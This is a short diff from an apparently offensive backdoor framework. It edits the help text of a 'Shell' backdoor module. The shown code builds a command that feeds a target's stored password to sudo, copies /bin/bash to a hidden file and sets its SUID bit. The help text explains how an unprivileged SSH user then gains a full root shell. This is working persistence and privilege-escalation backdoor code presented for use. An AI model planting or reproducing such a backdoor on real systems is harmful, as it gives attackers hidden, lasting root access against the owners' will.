@@ -13,7 +13,7 @@ class Shell(Backdoor):
         
         self.modules = {} 
         self.allow_modules = True
-        self.help_text = GOOD + "The shell backdoor is a priviledge escalation backdoor, similar to (but more powerful than) it's SetUID escalation brother. It duplicates the bash shell to a hidden binary, and sets the SUID bit. Unlike the SetUID backdoor though, this shell gives an unpriviledged user root priviledge with a full shell.  To use, while SSHed in as an unpriviledged user, simply run \".bash -p\", and you will have root access." 
+        self.help_text = GOOD + "The shell backdoor is a priviledge escalation backdoor, similar to (but more powerful than) it's SetUID escalation brother. It duplicates the bash shell to a hidden binary, and sets the SUID bit. Unlike the SetUID backdoor though, this shell gives an unpriviledged user root priviledge with a full shell.  Note that you need root access to initially deploy. To use, while SSHed in as an unpriviledged user, simply run \".bash -p\", and you will have root access." 
 
     def get_command(self):
         return "echo " + self.core.curtarget.pword + " | sudo -S cp /bin/bash " + self.get_value("name") + " && echo " + self.core.curtarget.pword + " | sudo -S chmod 4755 " + self.get_value("name")
